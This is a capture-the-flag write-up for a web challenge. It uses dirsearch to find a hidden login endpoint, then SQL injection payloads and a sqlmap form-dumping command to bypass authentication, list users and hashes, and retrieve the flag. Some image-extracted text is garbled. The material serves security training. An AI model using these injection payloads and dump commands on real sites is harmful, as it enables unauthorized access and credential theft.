# the Injection
> Hack this out http://0x7e7ctf.zerobyte.me:1339/

## About the Challenge
You've been provided with a website without the source code, where only static pages exist without any information on the site.


[Image extracted text: Site Under Maintenance
We apologize for the inconvenience_
but our website is currently undergoing maintenance
Please check back later:]


## How to Solve?
Since there's no information on this page, a directory brute force using `dirsearch` is conducted. Here's the command I used:

```bash
dirsearch -u http://0x7e7ctf.zerobyte.me:1339/
```


[Image extracted text: (kaliokali)-[~/Desktop
dirsearch
http: //0x7e7ctf zerobyte.me
1339/
V0.4.2
clir5 &_Cu"ch
Extensions:
php
aspx, jsp, html,
HTTP
method:
GET
Threads:
Mordli
Output File:
Ihome/kalil
dirsearch/reports/OxZezctf zerobyte.me-1339/-_23-08
Error
/home/kalil dirsearch/logs/errors-23-08-19_10-38-58.log
Target: http:/0x7e7ctf zerobyte
me : 1339/
[10: 38:58] Starting:
[10.39:02 ]
403
287B
nt_WST
txt
[10.39
[10:39
2878
4ad
htaccess
[10
htaccess orig
[10:39
chtaccess
save
[10.39
htaccess
extra
[10:39:02
htaccessOLD2
[10
htaccess
bakl
287
ntm
1
Vouabecome ,
[10
2870
html
[10.39
htaccess_orig
[10
htaccess
[10.39:02
httr-oauth
[10:39:02 E
htpassNds
[10:39:02 ]
287B
htpasswd
test
[10:39:03]
2878
php
[10:39:42]
200
935B
lindex.html
[10:39:46] 200
/login.php
[10:40:00]
403
287B
[serverestatus/
[10:40:00]
403
287B
Aserver-status
Log :
2K8]


There's a file named `login.php,` and when accessed, it displays a login page without any additional features like registration or password recovery. If you view the page source by pressing `Ctrl + U,` there's an HTML comment containing another endpoint named `asuka_is_best_gurl.php`


[Image extracted text: <input
type=
submit
valuez"Login"
form}
<(div>
</body>
</html>
Hello admin,
white hat hacker Who has
found
vulnerability in your system.
have
already patched
the login page,
but you are
still
able to access your
old code at asuka_is
best
php _
Burl]


When accessing this endpoint, it turns out there's the same login page. However, based on the previous HTML comment, this PHP file is vulnerable to a certain vulnerability.


[Image extracted text: Login
Username:
Password:
Login]


If there's a login page, the first thing typically attempted is SQL Injection, by inputting:

```
username: ' or true-- -
password: test
```


[Image extracted text: 7
C
Not secure
OxTeZctfzerobyte me:1339/024599c3f09760daa636921798e1c925.php
Content
Hello shinji!
There is n0
for this user:
Logout
flag]


After inputting the SQL injection payload, here I logged in with the username `shinji`, but the flag didn't appear using the username `shinji`. So, I'm going to try to find other usernames using SQLMap, targeting the `asuka_is_best_gurl.php` endpoint. Below is the command I used to find usernames on this site:

```bash
sqlmap -u http://0x7e7ctf.zerobyte.me:1339/asuka_is_best_gurl.php --forms --dump
```

There are 5 users found in the `asuka_db` database.


[Image extracted text: id
password
usernale
Occf38be2d49c8b34a689a629fa263ad
Shinji
2
Ofe69241e61baae968aSe2dabfafaaed
kaworu
Taa71eOdal2al2bf8fdlaccda88d8fdf
rei
3
1391f7bfefd7b7a0ff8ee6ef97dcds0f
misato
5
64d932f4f8d87561a36a34bef6bac02f
asuka]


Then, here I will attempt to log in one by one using the existing usernames. The payload I'm using is as follows:

```
username: asuka' order by 1-- -
password: test
```


[Image extracted text: Not secure
OxTelctf zerobyte me:1339/024599c3f09
Content
Hello asuka!
ObyteCTF {Inj3ction_fOr_lyf}
Logout]


```
0byteCTF{Inj3ction_f0r_lyf}
```